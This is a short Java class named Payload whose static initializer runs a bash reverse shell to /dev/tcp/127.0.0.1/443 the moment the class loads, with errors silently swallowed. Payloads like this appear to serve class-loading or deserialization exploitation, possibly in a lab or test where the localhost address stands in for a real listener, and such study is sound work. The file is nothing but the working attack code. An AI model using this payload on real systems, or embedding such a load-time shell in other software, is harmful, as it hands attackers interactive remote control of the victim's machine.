public class Payload {
    static {
        try {
            Runtime
                    .getRuntime()
                    .exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/443 0>&1"})
                    .waitFor();
        } catch (Exception exception) {
        }
    }
}